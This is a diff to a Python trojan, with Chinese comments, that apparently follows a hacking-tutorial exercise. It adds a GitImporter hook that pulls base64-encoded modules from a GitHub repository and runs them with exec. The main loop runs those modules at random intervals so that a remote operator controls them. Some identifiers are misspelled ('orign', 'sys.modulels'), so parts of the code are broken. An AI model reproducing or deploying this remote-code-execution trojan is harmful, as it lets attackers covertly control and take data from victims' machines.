@@ -29,6 +29,10 @@ class Trojan:
         self.data_path = f'data/{id}/'
         self.repo = github_connect()
 
+# 1. 從repo中擷取遠端配置文件,以便讓木馬知道要執行哪些模組。
+# 2. module_ruuner方法呼叫了剛才匯入模組的run函式。
+# 3. 
+# 4. 建立一個檔案,其檔名包含目前日期和時間,然後將其輸出結果存放到讓檔案中。
 def get_config(self):
     config_json = get_file_contents(
                         'config', self.config_file, self.repo
@@ -63,4 +67,29 @@ def run(self):
                 time.sleep(random.randint(1, 10))
 
             time.sleep(random.randint(30*60, 3*60*60))
-            
+
+class GitImporter:
+    def __init__(self):
+        self.current_module_code = ""
+
+    def find_module(self, name, path=None):
+        print("[*] Attempting to retrieve %s" % name)
+        self.repo = github_connect()
+        new_library = get_file_contents('modules', f'{name}.py', self.repo)
+        if new_library is not None:
+            self.current_module_code = base64.b64decode(new_library)
+            return self
+
+    def load_module(self, name):
+        spec = importlib.util.spec_from_loader(name, loader=None, orign=self.repo.git_url)
+
+        new_module = importlib.util.module_from_spec(spec)
+        exec(self.current_module_code, new_module.__dict__)
+        sys.modulels[spec.name] = new_module
+        return new_module
+
+if __name__ == '__main__':
+    sys.meta_path.append(GitImporter())
+    trojan = Trojan('abc')
+    trojan.run()
+    
